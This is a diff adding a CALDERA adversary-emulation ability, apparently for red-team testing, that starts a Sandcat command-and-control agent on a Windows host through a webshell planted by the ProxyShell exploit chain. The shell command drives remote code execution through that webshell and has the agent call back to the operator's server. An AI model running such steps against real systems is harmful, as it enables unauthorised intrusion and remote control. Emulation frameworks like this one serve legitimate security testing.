@@ -1,0 +1,18 @@
+- id: 554cc237-02c1-423f-ba52-e612bd1b4d1c
+  name: Initialise ProxyShell RCE Agent
+  description: Spawns a Sandcat RCE client, configured to use the webshell planted on a remote host using the ProxyShell chain of vulnerabilities.
+  tactic: initial-access
+  technique:
+    attack_id: T1190
+    name: "Exploit Public-Facing Application"
+  platforms:
+    linux:
+      sh:
+        command: |
+          caldera_host="#{app.contact.http}";
+          rce_command="chmod +x ./proxyshell-rce && ./proxyshell-rce -u #{target.webshell.url} -c \"COMMAND\"";
+          chmod +x ./sandcat-rce;
+          timeout 60 ./sandcat-rce -server $caldera_host -rceCommand "$rce_command" -rcePlatform windows -rceExecutor psh -rcePayloadName proxyshell-rce -originLinkID #{origin_link_id}
+        timeout: 5
+        payloads:
+          - sandcat-rce
